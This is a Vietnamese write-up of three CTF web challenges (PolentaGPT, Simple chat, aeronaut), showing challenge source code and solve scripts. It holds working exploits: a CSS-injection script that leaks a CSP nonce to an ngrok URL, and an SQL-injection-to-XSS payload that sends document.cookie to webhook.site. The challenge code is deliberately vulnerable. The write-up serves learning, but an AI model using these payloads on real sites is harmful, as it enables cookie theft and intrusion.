PolentaGPT:
    chúng ta có 1 file app.py , 1 index.html và 1 con bot
    (*) source app.py:
    
        import os, base64
    import random
    import string
    import requests
    from flask import Flask, render_template, request, jsonify, make_response, g
    
    template_dir = os.path.abspath('templates')
    
    flag = os.getenv("FLAG")
    securetoken = os.getenv("SECURETOKEN")
    
    OLLAMA_HOST = os.getenv("OLLAMA_HOST", "http://ollama:11434/api/generate")
    
    app = Flask(__name__, template_folder=template_dir)
    
    nonce_cache = {}
    
    def generate_nonce():
        return ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    
    @app.before_request
    def before_request():
        client_ip = request.remote_addr
    
        if client_ip not in nonce_cache:
            nonce_cache[client_ip] = generate_nonce()
            
        g.nonce = nonce_cache[client_ip]
    
    @app.after_request
    def apply_csp(response):
        nonce = getattr(g, "nonce", None)
        if nonce is None:
            nonce = base64.b64encode(os.urandom(16)).decode()
            g.nonce = nonce                   
    
        csp = (
            f"script-src 'nonce-{nonce}'"
            f"script-src-elem 'nonce-{nonce}'; "
            f"script-src-attr 'nonce-{nonce}'; "
            "object-src 'none'; "
            "frame-ancestors 'none'; "
            "upgrade-insecure-requests"
        )
    
        response.headers["Content-Security-Policy"] = csp
    
        if request.cookies.get("securetoken") == securetoken:
            response.set_cookie("flag", flag)
    
        return response
    
    
    @app.route("/")
    def index():
        return make_response(render_template("index.html", nonce=g.nonce))
    
    @app.route("/chat", methods=["POST"])
    def chat():
        user_message = request.json.get("message", "")
    
        payload = {
            "model": "qwen3:0.6b", 
            "prompt": user_message,
            "stream": False,
            "max_tokens": 10,
            "temperature": 0.1  
        }
    
        try:
            response = requests.post(OLLAMA_HOST, json=payload)
            response_data = response.json()
            ai_message = response_data.get("response", "Error in Ollama's response.")
        except Exception as e:
            ai_message = f"An error occurred: {e}"
    
        return jsonify({"reply": ai_message})
    
    
    
    
    
    if __name__ == "__main__":
        app.run(debug=True, host="0.0.0.0")
    
    (*) source index.html
          <!doctype html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>PolentaGPT - Chat with AI</title>
        <nonce value="{{ nonce }}"></nonce>
        <script src="https://code.jquery.com/jquery-3.6.0.min.js" nonce="{{ nonce }}"></script>
        <style>
            body { font-family: Arial, sans-serif; background: #f0f0f0; }
            #chat { width: 500px; margin: 50px auto; background: white; padding: 20px; border-radius: 5px; }
            .message { margin: 10px 0; }
            .user { color: blue; }
            .ai { color: green; }
            textarea { width: 100%; }
            button { padding: 10px 20px; margin-top: 10px; }
            .logo {
                text-align: center;
                margin-bottom: 20px;
            }
            .logo img {
                max-width: 200px;
            }
        </style>
    </head>
    <body>
        <div id="chat">
            <div class="logo">
                <!-- <img src="/static/polenta_logo.png" alt="PolentaGPT Logo"> -->
            </div>
            <h1>PolentaGPT Chat</h1>
            <div id="chatbox"></div>
            <form id="chatForm">
                <textarea id="userInput" name="text" rows="3" placeholder="Write your message here..."></textarea><br>
                <button id="sendBtn">Send</button>
            </form>
        </div>
        <script nonce="{{ nonce }}" >
            $(document).ready(function(){
                $("#chatForm").submit(function(e){
                    e.preventDefault();
                });
                $("#sendBtn").click(function(){
                    var message = $("#userInput").val().trim();
                    if(message === "") return;
    
                    $("#chatbox").append("<div class='message user'><strong>You:</strong> " + message + "</div>");
                    $("#userInput").val("");
    
                    $.ajax({
                        type: "POST",
                        url: "/chat",
                        contentType: "application/json",
                        data: JSON.stringify({ message: message }),
                        success: function(data){
                            $("#chatbox").append("<div class='message ai'><strong>PolentaGPT:</strong> " + data.reply + "</div>");
                            $("#chatbox").scrollTop($("#chatbox")[0].scrollHeight);
                        },
                        error: function(){
                            $("#chatbox").append("<div class='message ai'><strong>PolentaGPT:</strong> Communication error.</div>");
                        }
                    });
                });
            });
        </script>
    </body>
    </html>
    source bot.js:
    
    const express = require("express");
    const puppeteer = require("puppeteer");
    
    const app = express();
    const securetoken = process.env.SECURETOKEN;
    app.use(express.urlencoded({ extended: true }));
    
    const contactFormHtml = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <title>Contact the Bot</title>
    </head>
    <body>
      <h1>Contact the Bot</h1>
      <form action="/contact" method="post">
        <label for="text">Text to submit:</label>
        <input type="text" id="text" name="text" placeholder="Enter your text here" required><br><br>
        <button type="submit">Send</button>
      </form>
    </body>
    </html>
    `;
    
    app.get("/", (req, res) => {
      res.send(contactFormHtml);
    });
    
    app.post("/contact", async (req, res) => {
      const text = req.body.text;
      console.log("Received text:", text);
      if (!text) {
        return res.status(400).send("Text not provided");
      }
    
      let browser;
      try {
        browser = await puppeteer.launch({
          headless: "new",  // Ensure latest headless mode
          args: ["--no-sandbox", "--disable-setuid-sandbox"]
        });
    
        const page = await browser.newPage();
        
        await page.setCookie({
          name: "securetoken",
          value: securetoken,
          url: "http://polentagpt:5000"
        });
        console.log('Secure token set in cookie:', securetoken);
    
        await page.goto("http://polentagpt:5000", { waitUntil: "domcontentloaded", timeout: 0 });
        await page.content();
        await page.waitForSelector('#userInput', { visible: true });
        await page.type('#userInput', text);
        await page.click('#sendBtn');
    
    
    
        await new Promise(resolve => setTimeout(resolve, 5000));
        res.send("Done");
      } catch (error) {
        res.status(500).send(`Puppeteer error: ${error.message}`);
      } finally {
        if (browser) {
          await browser.close();
        }
      }
    });
    
    app.listen(5000, () => {
      console.log("Server running on http://0.0.0.0:5000");
    });
    
    
    tổng kết lại , chúng ta có 1 cái app python có khả năng chat với AI cùng với filter csp cho xss khá căng:
    (
        csp = (
            f"script-src 'nonce-{nonce}'"
            f"script-src-elem 'nonce-{nonce}'; "
            f"script-src-attr 'nonce-{nonce}'; "
            "object-src 'none'; "
            "frame-ancestors 'none'; "
            "upgrade-insecure-requests"
        )
    )
    ,phải có nonce thì mới có thể xử lý tag để inject xss được , tuy nonce mẫu có trong file index.html nhưng vì bản thân bot và clent dùng 2 nonce khác nhau
    (vì nonce được gán với 1 ip riêng biệt :
        client_ip = request.remote_addr
    
        if client_ip not in nonce_cache:
            nonce_cache[client_ip] = generate_nonce()
            
        g.nonce = nonce_cache[client_ip]) nên tuy ta có thể inject tag ở clent nhưng không thế sử dụng ở bên bot để inject tag vô
    
    , 1 con bot có chứa securetoken 
    (cái mà khi cho nó vào cookie của app py kia thì sẽ có Flag:
        if request.cookies.get("securetoken") == securetoken:
            response.set_cookie("flag", flag)
    )
    
    mình đã thử rất nhiều cách, từ việc đoán seed đến các phương pháp bypass csp khác nhưng đều vô dụng
    sau khi giải kết thúc thì mình mới có được câu trả lời từ wu của 1 ông bạn trong discord:
    sử dụng css injection với css selector:
    
    ý tưởng : lợi dụng cơ chế của thẻ <style>nonce[value^="a"] { background-image: url(https://235c-62-176-122-50.ngrok-free.app/exfil?nonce=a); }
      Với :
        tạo các css selector với các điều kiện khác nhau (giống kiểu if else)
        nonce[value^="a"] là các điều kiện kiểm tra nếu thoả mãn điều kiện nonce bắt đầu bằng "a" thì sẽ set css theo cái thuộc tính đó => đồng nghĩa với việc là nó sẽ curl đến url của chúng ta để confirm (thực chất là để lấy ảnh cho backgroud nhưng bị chúng ta lợi dụng làm cái để confirm điều kiện)
        với điều kiện là phải có thẻ chứa nonce trong html trong app.py sẵn có
    ==> từ đó ta có thể xây dựng script với ý tưởng như sau:
    1. tạo server nhỏ với ngrok (hoặc cùng cloudfare ... nếu muốn)
    gửi css selector với điều kiện kiểm tra với "for các kí tự để brute" vào trong input đến bot qua /contact với "data" param trong body chứa our payloads để bot đến trang app.py rồi nhập payload vào trong khung chat để tự mình thực hiện css injection
    nếu đúng , query sẽ lập tức curl đến server của chúng ta để confirm , sau đó server của ta đã lập tiếp tục gửi data = các chữ cái trong nonce đã đc confirm + "for các kí tự để brute" để tiếp tục xác nhận cho đến khi tìm đc nonce đầy đủ thì cứ inject xss như thường thôi để lấy cookie=securetoken => tạo cookie ở trong web app.py để lấy Flag
    
    payload thực thi :
    import requests
    import string
    from flask import Flask, request
    
    app = Flask(__name__)
    
    
    BASE_URL = "https://polentagpt-bot-60b2b295.challs.cornc.tf"
    headers = {
        "Content-Type: application/x-www-form-urlencoded"
    }
    session = requests.Session()
    
    charset = string.ascii_letters + string.digits
    
    def exploit(known):
        payload = "<style>"
        for char in charset:
            payload += f"""nonce[value^="{known}{char}"] {{ background-image: url(https://235c-62-176-122-50.ngrok-free.app/exfil?nonce={known}{char}); }}\n"""
        payload += "</style>"
    
        data = {
            "text": payload,
        }
    
        r = session.post(BASE_URL + "/contact", data=data)
    
        return r.status_code
    
    @app.route("/exfil")
    def home():
        nonce = request.args.get("nonce")
        print("Exfiltrating nonce:", nonce)
        exploit(nonce)
        return "OK", 200
    
    exploit("")
    
    if __name__ == "__main__":
        app.run(host="127.0.0.1", port=1337, debug=True)
    
    xong có nonce thì cứ inject xss như thường thôi để lấy cookie=securetoken => tạo cookie ở trong web app.py để lấy Flag 


____________________________________________________________________________________________________________________________________________________________________

Simple chat:
    
(*) app.js :
        import express from 'express';
import session from 'express-session';
import bodyParser from 'body-parser';
import { PostgresClient } from "./db.js";
const app = express()
const port = 3000

const FRIENDS = ['Val','augusto','CubikMan47','LolLo','Hiipso','FTW'];
const CHALLENGE_HOST = process.env.CHALLENGE_HOST || 'http://challenge:3000'
const HEADLESS_HOST = process.env.HEADLESS_HOST || 'headless:5000';
const HEADLESS_AUTH = process.env.HEADLESS_AUTH || 'supersecret';
const FLAG = process.env.FLAG || 'corn{redacted}';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'supersecret';
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

await sleep(1000);
const db = new PostgresClient();
const connection = await db.connect();
if(connection == 0){
  console.log("Connected!");
}
await db.init();

app.set("view engine", "ejs");
app.set('views', '/app' + '/templates');
app.use(bodyParser.json())
app.use('/static',express.static('static'));
app.use(session({
  secret: process.env.SECRET || 'SuperSecret',
  resave: false,
  saveUninitialized: false,
}))

app.get('/', (req, res) => {
  if(!req.session.username){
    res.redirect('/login');
    return;
  }
  res.render(`index`);
})

app.get('/login', (req,res) => {
  res.render('login');
})

app.get('/register', (req,res) => {
  res.render('register');
})

app.post('/api/v1/login',async (req,res) => {
  const username = req.body.username;
  const password = req.body.password;
  if(typeof username !== 'string' || typeof password !== 'string' || username == '' || password == ''){
    res.json({'status':'bad credentials'})
    return
  }
  const isLoggedIn = await db.login(username,password);
  if(!isLoggedIn){
    res.json({'status':'wrong credentials'})
    return
  }
  const response = {'status':'you are logged in!'}
  req.session.username = username
  res.json(response)
})

app.get('/api/v1/profile',async (req,res) => {
  if(!req.session.username){
    res.json({'status':'You are not logged in.'})
    return;
  }
  res.json({'status':'success','profile':req.session.username})
})

app.get('/api/v1/fetchMessages',async (req,res) => {
  if(!req.session.username){
    res.json({'status':'You are not logged in.'})
    return;
  }
  const friend = req.query.friend;
  if(!FRIENDS.includes(friend)) {
    res.json({'status':"this guy doesn't exist lmaoooo"})
    return;
  }
  const result = await db.fetchMessages(req.session.username,friend);
  res.json({'status':'success','messages':result})
})

app.post('/api/v1/insertChat',async (req,res) => {
  const sender = req.body.sender;
  const receiver = req.body.receiver;
  var message = req.body.message;

  if(!FRIENDS.includes(sender) && sender !== 'admin' && sender !== 'kekw'){
    res.json({'status':"you can't write messages on behalf of other people."})
    return
  }

  if(!FRIENDS.includes(receiver) && receiver !== 'admin' && receiver !== 'kekw') {
    res.json({'status':"you can't write to nobody"})
    return;
  }

  //no XSS
  message = message.replaceAll('<','&lt;');
  message = message.replaceAll('>','&gt;');

  const result = await db.insertChat(sender,receiver,message);
  if(result != 0){
    res.json({'status':"Couldn't insert the chat."});
    return;
  }
  const response = {'status':'Success'};
  res.json(response);
})

app.get('/ping', async (req,res) => {
  const friend = req.query.friend;
  if(!req.session.username){
    res.json({'status':"You have to be logged in to ping admin"});
    return;
  }
  // khi ma
  if(!FRIENDS.includes(friend)){
    res.json({'status':"You are not admin's friend"});
    return;
  }
  fetch(`${HEADLESS_HOST}/`, { 
    method: 'POST', 
    headers: { 'Content-Type': 'application/json', 'X-Auth': HEADLESS_AUTH },
    body: JSON.stringify({
        browser: 'chrome',
        actions: [
            {
                type: 'request',
                url: `${CHALLENGE_HOST}/`,
            },
            {
                type: 'set-cookie',
                name: 'flag',
                value: FLAG
            },
            {
                type: 'sleep',
                time: 2
            },
            {
                type: 'type',
                element: 'input#username', //username
                value: 'admin'
            },
            {
                type: 'type',
                element: 'input#password', //password
                value: ADMIN_PASSWORD
            },
            {
                type: 'sleep',
                time: 1
            },            
            {
                type: 'click',
                element: 'input[type=submit]'
            },
            {
                type: 'sleep',
                time: 5
            },
            {
                type: 'click',
                element: `#friend-list > li:nth-child(${FRIENDS.indexOf(friend)+1})` //opens chat with said friend
            },
            {
                type: 'sleep',
                time: 10
            },
        ]
     })}).then(r => {
      console.log(r.status_code)
     })
    
  res.json({'status':'Admin got pinged'})
})

app.listen(port, () => {
  console.log(`Challenge listening on port ${port}`)
})

(*)db.js:

import pg from 'pg'
const { Client } = pg
import crypto from 'crypto';
const POSTGRES_USER = process.env.POSTGRES_USER || 'postgres';
const POSTGRES_PASSWORD=process.env.POSTGRES_PASSWORD || 'password';
const POSTGRES_HOST=process.env.POSTGRES_HOST || 'db';
const POSTGRES_DB=process.env.POSTGRES_DB || 'postgres';
const ADMIN_PASSWORD=process.env.ADMIN_PASSWORD || 'supersecret';


export class PostgresClient {
    client;
    constructor(){
        this.client = new Client({
            user: POSTGRES_USER,
            host: POSTGRES_HOST,
            database: POSTGRES_DB,
            password: POSTGRES_PASSWORD,
            port: 5432,
          });
    }

    async connect() {
        await this.client.connect(function (err) {
            if (err) {
                throw err;
            }
        });
        return 0;
    }

    async close() {
        await this.client.end();
        return 0;
    }

    async init(){
        const query = `
                    DROP TABLE IF EXISTS chat;
                    DROP TABLE IF EXISTS users;
                    CREATE TABLE users(
                        username varchar(20) PRIMARY KEY NOT NULL,
                        password varchar(32) NOT NULL
                    );
                    INSERT INTO users(username,password) VALUES 
                        ('admin','${ADMIN_PASSWORD}'),
                        ('Val','${crypto.randomBytes(16).toString("hex")}'),
                        ('augusto','${crypto.randomBytes(16).toString("hex")}'),
                        ('CubikMan47','${crypto.randomBytes(16).toString("hex")}'),
                        ('LolLo','${crypto.randomBytes(16).toString("hex")}'),
                        ('Hiipso','${crypto.randomBytes(16).toString("hex")}'),
                        ('FTW','${crypto.randomBytes(16).toString("hex")}'),
                        ('kekw','kekw');
                    CREATE TABLE chat(
                        sender varchar(20) NOT NULL,
                        receiver varchar(20) NOT NULL,
                        message varchar(120) NOT NULL,
                        timestamp TIMESTAMP WITH TIME ZONE DEFAULT now(),
                        PRIMARY KEY (sender,receiver,message,timestamp),
                        FOREIGN KEY (sender) REFERENCES users(username),
                        FOREIGN KEY (receiver) REFERENCES users(username)
                    );
                    INSERT INTO chat(sender,receiver,message) VALUES
                    ('admin','Val','wym'),
                    ('Val','admin','kekw'),
                    ('Val','kekw','yoooo'),
                    ('Hiipso','kekw','U.U'),
                    ('FTW','kekw','OwO'),
                    ('CubikMan47','kekw','mhanz'),
                    ('LolLo','kekw','mhanz'),
                    ('augusto','kekw','Where flag');`;
        await this.client.query(query);
        return 0;
    }

    async login(username,password){
        try{
            const query = `SELECT * 
                           FROM users
                           WHERE username=$1 AND password=$2`;
            const parameters = [username,password];
            const result = await this.client.query(query,parameters);
            if(result.rowCount > 0){
                return true;
            }
            return false;
        } catch (e) {
            console.log(`Error: ${e}`);
            return false;
        }
    }

    async insertChat(sender,receiver,message){
        try{
            const query = `INSERT INTO chat(sender,receiver,message) VALUES ('${sender}','${receiver}','${message}');`;
            await this.client.query(query);
        } catch (e) {
            console.log(`Error: ${e}`)
            return 1;
        }
        return 0;
    }

    async fetchMessages(friend1,friend2){
        try{
            const query = `SELECT *
                       FROM chat 
                       WHERE sender='${friend1}' AND receiver='${friend2}'
                       UNION SELECT *
                       FROM chat
                       WHERE sender='${friend2}' AND receiver='${friend1}'
                       ORDER BY timestamp;`;
            const result = await this.client.query(query);
            return result.rows;
        } catch (e) {
            console.log(`Error: ${e}`)
            return [];
        }
    }
}

(*)script.js
const msgerForm = get(".msger-inputarea");
const msgerInput = get(".msger-input");
const msgerChat = get(".msger-chat");

const BOT_MSGS = [
  "Hi, how are you?",
  "Where flag",
  "Skill issue",
  "ziomela...",
  "I feel sleepy! :("
];



// Icons made by Freepik from www.flaticon.com
var BOT_NAME = document.getElementsByClassName("friend")[0].outerText;
var BOT_IMG = '/static/img/'+BOT_NAME+'.png';
const PERSON_IMG = "/static/img/kekw.jpg";
var PERSON_NAME = "";
fetchProfile().then(data => PERSON_NAME = data['profile']);
//fetchMessages(BOT_NAME);


const friends = [...document.getElementsByClassName("friend")];
friends.forEach(addClickListener);

function addClickListener(friend){
  friend.addEventListener("click", async event => {
    event.preventDefault();

    friends.forEach(unselect);
    BOT_NAME = friend.outerText;
    BOT_IMG = '/static/img/'+BOT_NAME+'.png';
    friend.className = 'friend selected';
    removeMessages();
    fetchMessages(BOT_NAME);
  })
}

function unselect(friend){
  friend.className = 'friend'
}

msgerForm.addEventListener("submit", async event => {
  event.preventDefault();

  const msgText = msgerInput.value;
  if (!msgText) return;

  const friend = document.getElementsByClassName("friend selected")[0].outerText;

  appendMessage(PERSON_NAME, PERSON_IMG, "right", msgText);
  msgerInput.value = "";

  await insertChat(PERSON_NAME,friend,msgText)
  botResponse();
});

function appendMessage(name, img, side, text) {
  //   Simple solution for small apps
  const msgHTML = `
    <div class="msg ${side}-msg">
      <div class="msg-img" style="background-image: url(${img})"></div>

      <div class="msg-bubble">
        <div class="msg-info">
          <div class="msg-info-name">${name}</div>
        </div>

        <div class="msg-text">${text}</div>
      </div>
    </div>
  `;

  msgerChat.insertAdjacentHTML("beforeend", msgHTML);
  msgerChat.scrollTop += 500;
}

async function fetchProfile() {
  const response = await fetch('/api/v1/profile',{
    method: 'GET',
  });
  const json = await response.json();
  return json;
}

async function fetchMessages(friend){
  const response = await fetch('/api/v1/fetchMessages?friend='+friend,{
    method: 'GET',
  });
  const json = await response.json();
  for(let i in json['messages']){
    if(json['messages'][i]['sender']==friend){
      appendMessage(friend, BOT_IMG, "left", json['messages'][i]['message']);
    } else {
      appendMessage(PERSON_NAME, PERSON_IMG, "right", json['messages'][i]['message']);
    }
  }
}

function removeMessages(){
  var toRemove = [...document.getElementsByClassName("msg")];
  for(const msg of toRemove){
    msg.remove();
  }
}

function botResponse() {
  const r = random(0, BOT_MSGS.length - 1);
  const msgText = BOT_MSGS[r];
  const delay = msgText.split(" ").length * 100;
  setTimeout(async () => {
    appendMessage(BOT_NAME, BOT_IMG, "left", msgText);
    await insertChat(BOT_NAME,PERSON_NAME,msgText);
  },delay);
}

async function insertChat(sender,receiver,message) {
  await fetch('/api/v1/insertChat',{
    method: 'POST',
    headers: {
      'Content-Type':'application/json; charset=utf-8'
    },
    body: JSON.stringify({'sender':sender,'receiver':receiver,'message':message})
  });
}

// Utils
function get(selector, root = document) {
  return root.querySelector(selector);
}

function formatDate(date) {
  const h = "0" + date.getHours();
  const m = "0" + date.getMinutes();

  return `${h.slice(-2)}:${m.slice(-2)}`;
}

function random(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

Tổng kết lại là chúng ta có 1 cái web chat như messenger với mn 
(nhưng mà khi login thì phải dùng acc kekw:kekw thì mới có thể vào)
                    INSERT INTO users(username,password) VALUES 
                        ('admin','${ADMIN_PASSWORD}'),
                        ('Val','${crypto.randomBytes(16).toString("hex")}'),
                        ('augusto','${crypto.randomBytes(16).toString("hex")}'),
                        ('CubikMan47','${crypto.randomBytes(16).toString("hex")}'),
                        ('LolLo','${crypto.randomBytes(16).toString("hex")}'),
                        ('Hiipso','${crypto.randomBytes(16).toString("hex")}'),
                        ('FTW','${crypto.randomBytes(16).toString("hex")}'),
                        ('kekw','kekw');

khi vào trang chủ , chúng ta có thể chat với các con bot 1 cách vô nghĩa kkk:

                    INSERT INTO chat(sender,receiver,message) VALUES
                    ('admin','Val','wym'),
                    ('Val','admin','kekw'),
                    ('Val','kekw','yoooo'),
                    ('Hiipso','kekw','U.U'),
                    ('FTW','kekw','OwO'),
                    ('CubikMan47','kekw','mhanz'),
                    ('LolLo','kekw','mhanz'),
                    ('augusto','kekw','Where flag');`;

tuy vậy , chúng ta có thể sử dụng /ping?friend=ten_friend để ép admin mở + đọc chat của ten-friend và admin (chính là bot)  

còn nữa , app dính sql injection (vì không có filter sql gì cả) và xss (data từ database đến clent không filter gì cả)

    async insertChat(sender,receiver,message){
        try{
            const query = `INSERT INTO chat(sender,receiver,message) VALUES ('${sender}','${receiver}','${message}');`;
            await this.client.query(query);
        } catch (e) {
            console.log(`Error: ${e}`)
            return 1;
        }
        return 0;
    }

app.post('/api/v1/insertChat',async (req,res) => {
  const sender = req.body.sender;
  const receiver = req.body.receiver;
  var message = req.body.message;

  if(!FRIENDS.includes(sender) && sender !== 'admin' && sender !== 'kekw'){
    res.json({'status':"you can't write messages on behalf of other people."})
    return
  }

  if(!FRIENDS.includes(receiver) && receiver !== 'admin' && receiver !== 'kekw') {
    res.json({'status':"you can't write to nobody"})
    return;
  }

  //no XSS
  message = message.replaceAll('<','&lt;');
  message = message.replaceAll('>','&gt;');

  const result = await db.insertChat(sender,receiver,message);
  if(result != 0){
    res.json({'status':"Couldn't insert the chat."});
    return;
  }
  const response = {'status':'Success'};
  res.json(response);
})

tuy vậy , chúng ta không thể trực tiếp gửi xss cho bot/admin vì không phải bạn:
  if(!req.session.username){
    res.json({'status':"You have to be logged in to ping admin"});
    return;
  }
  // khi ma
  if(!FRIENDS.includes(friend)){
    res.json({'status':"You are not admin's friend"});
    return;
  }

vì vậy ta có thể kết hợp sql injection để thực thi xss bằng cách nhét payload xss trong payload sql (đc encode để né filter xss đầu vào) ,nhét payload đó vào 1 
ng bất kì để thực thi sql injection vào database để inject xss vào đoạn chat của ng đó và admin để rồi sử dụng tính năng /ping để gọi bot vào xem đoạn chat đó
để thực thi xss lấy cookie chứa flag của bot's brower 

payloads:
    import requests
import base64
import time
import os

token_id = "00000000-0000-0000-0000-000000000000"

XSS = f'<img src=x onerror="location=`https://webhook.site/{token_id}?`+document.cookie"></img>'

SQLI = f"//kekw'),('augusto','admin',convert_from(decode('{base64.b64encode(XSS.encode()).decode()}', 'base64'),'utf-8'))-- -"

print(SQLI)

s = requests.Session()

URL = os.getenv("HOST", "http://localhost")

s.post(URL+"/api/v1/login",json={'username':'kekw','password':'kekw'})

s.post(URL+"/api/v1/insertChat",json={'sender':'kekw','receiver':'augusto','message':f'{SQLI}'})

response = s.get(URL+"/ping?friend=augusto")

print(response.json())

time.sleep(20)

response = requests.get('https://webhook.site/token/'+ token_id +'/requests')

if 'corn' in response.json()['data'][0]['url']:
    print(response.json()['data'][0]['url'].split("?flag=")[1])

và chúng ta có thể lấy flag 

aeronaut:
    import os
import eventlet
eventlet.monkey_patch()

from flask import Flask, request, send_file
from flask_cors import CORS
from flask_socketio import SocketIO, emit
from gamestate import GameState
from playerstate import Player
import time

from utils import *

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

gs = GameState()

@app.route('/home')
@app.route('/')
@app.route('/index')
def index():
    return send_file('static/index.html')

#lfi
@app.route('/static/<path:filename>')
def serve_static(filename):
    return send_file(f'static/{filename}')

# Start game loop in background
@socketio.on('connect')
def handle_connect():
    """Handle new client connection"""
    sid = request.sid
    print(f'Client connected: {sid}')
    
    # Add new player if not exists
    if not gs.get_player(sid):
        gs.add_player(sid, Player(sid))
    
    # Send initial game state
    socketio.emit('game_state', {
        'phase': gs.game_phase,
        'multiplier': round(gs.current_multiplier, 2),
        'time_left': gs.BETTING_DURATION - gs.current_slot_time
    }, room=sid)

    socketio.emit('player_count', len(gs.players))



@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnect"""
    sid = request.sid
    print(f'Client disconnected: {sid}')
    gs.remove_player(sid)
    socketio.emit('player_count', len(gs.players))

@socketio.on('place_bet')
def handle_place_bet(data):
    """Handle bet placement from client"""
    sid = request.sid
    player = gs.get_player(sid)
    
    if not player:
        socketio.emit('error', {'message': 'Player not found'}, room=request.sid)
        return
        
    if gs.game_phase != 'betting':
        socketio.emit('error', {'message': 'Betting closed'}, room=request.sid)
        return
    
    if player.bet > 0:
        socketio.emit('error', {'message': 'You already placed a bet'}, room=request.sid)
        return
    

    try:
        amount = float(data['amount'])
    except ValueError:
        socketio.emit('error', {'message': 'Invalid bet amount'}, room=request.sid)
        return
    if amount < 1 or amount > player.balance:
        socketio.emit('error', {'message': 'Invalid bet amount'}, room=request.sid)
        return
    
    # Deduct bet and update player state
    success = player.place_bet(amount)
    if success:
        socketio.emit('bet_response', {
            'success': True,
            'balance': player.balance,
            'bet_amount': amount
        }, room=request.sid)
    else:
        socketio.emit('bet_response', {'success': False}, room=request.sid)

@socketio.on('cashout')
def handle_cashout():
    """Handle cashout request"""
    sid = request.sid
    player = gs.get_player(sid)
    
    if not player:
        socketio.emit('error', {'message': 'Player not found'}, room=request.sid)
        return
        
    if gs.game_phase != 'game':
        socketio.emit('error', {'message': 'Cannot cashout now'}, room=request.sid)
        return
    
    if player.bet == 0:
        socketio.emit('error', {'message': 'No active bet'}, room=request.sid)
        return
    
    # Calculate winnings
    winnings = player.bet * gs.current_multiplier
    player.balance += winnings
    player.bet = 0
    
    socketio.emit('cashout_response', {
        'success': True,
        'winnings': round(winnings, 2),
        'balance': player.balance,
        'multiplier': round(gs.current_multiplier, 2)
    }, room=request.sid)

    if player.balance >= 100_000_000:
        socketio.emit('error', {
            'message': os.environ.get('FLAG')
        }, room=request.sid)
        return

def game_loop():
    """Background game loop"""
    round_number = 0
    random.seed(int(time.time()))
    mult_list = [generate_multiplier() for i in range(10000)]
    while True:
        # Start new round
        gs.max_multiplier = mult_list[round_number % 10000]
        round_number += 1
        gs.current_multiplier = 1.0
        gs.game_phase = 'betting'
        gs.round_start_time = time.time()
        
        # Betting phase
        print(bcolors.WARNING + "Betting phase" + bcolors.ENDC)
        while time.time() - gs.round_start_time < gs.BETTING_DURATION:
            socketio.sleep(0.1)
            time_left = gs.BETTING_DURATION - (time.time() - gs.round_start_time)
            
            # Broadcast game state
            socketio.emit('game_state', {
                'phase': gs.game_phase,
                'time_left': round(time_left, 1),
                'multiplier': round(gs.current_multiplier, 2)
            })
        
        # Game phase
        print(bcolors.OKGREEN + "Game phase" + bcolors.ENDC)
        for p in gs.players.values(): print(p)
        gs.game_phase = 'game'
        start_time = time.time()
        
        while gs.current_multiplier < gs.max_multiplier:
            elapsed = time.time() - start_time
            gs.current_multiplier = calculate_multiplier(elapsed)  # From utils
            
            socketio.emit('game_state', {
                'phase': gs.game_phase,
                'multiplier': round(gs.current_multiplier, 2)
            })
            
            socketio.sleep(0.1)  # Update 10x/second
        
        # End phase
        print(bcolors.FAIL + "End phase" + bcolors.ENDC)
        socketio.emit('game_state', {
            'phase': 'ended',
            'multiplier': gs.max_multiplier
        })
        
        socketio.sleep(0.2) # fix latency
        gs.game_phase = 'ended'
        # Reset bets
        for player in gs.players.values():
            if player.bet > 0:
                player.lose()
        
        socketio.sleep(2)  # Cooldown before next round

if __name__ == '__main__':
    socketio.start_background_task(game_loop)
    socketio.run(app, debug=False, port=5000, host='0.0.0.0')

tổng quan ,ta thấy được đây là 1 game có sử dụng web socket , với việc khởi điểm là 10$ và khi khởi động quá trình bet , có các con số phần trăm tăng dần sẽ hiện
lên trên màn hình và có chức năng cashout , khi cashout thì sẽ lấy số tiền ấy nhân với phần trăm tại thời điểm cashout thì ra số tiền ta có . Tuy vậy , nếu mà 
thời gian bet kết thúc (k hiện lên màn hình) thì sẽ mất hết xèng
vậy nên , giải quyết bằng cách chúng ta sẽ viết 1 script để tự động hoá việc này nhằm để tự động hoá việc bet nhằm để căn thời gian để bet chính xác để có thể kiếm
được nhiều tiền hơn:

Payloads:

import socketio

with socketio.SimpleClient() as sio:
    sio.connect('https://aeronaut.challs.cornc.tf/')

    print('my sid is', sio.sid)

    balance = 10.0
    can_bet = True
    while True:
        event = sio.receive()
        # print('received event:', event)

        if balance > 100_000_000:
            print('You have reached the maximum balance limit.')
            

        if event[0] == 'bet_response':
            print('Bet response:', event[1])
        if event[0] == 'game_state':
            phase = event[1]['phase']

            if phase == 'betting':
                if can_bet:
                    print(f'Placing bet of {balance}')
                    sio.emit('place_bet', {'amount': balance})
                    can_bet = False
            if phase == 'ended':
                 multiplier = event[1]['multiplier']
                 sio.emit('cashout')
                 print(f'Game ended with multiplier: {multiplier}')
                 print('Waiting for cashout response...')
        if event[0] == 'cashout_response':
            if event[1]['success']:
                winnings = event[1]['winnings']
                balance_resp = event[1]['balance']
                multiplier = event[1]['multiplier']
                balance = balance_resp
                print(f'Cashout successful! Winnings: {winnings}, New balance: {balance}')
                can_bet = True
        if event[0] == 'error':
            print(f"Error: {event[1]['message']}")

            if "corn{" in event[1]['message']:
                print("Flag found! Exiting...")
                break
            # exit()

và ta có thể lấy flag


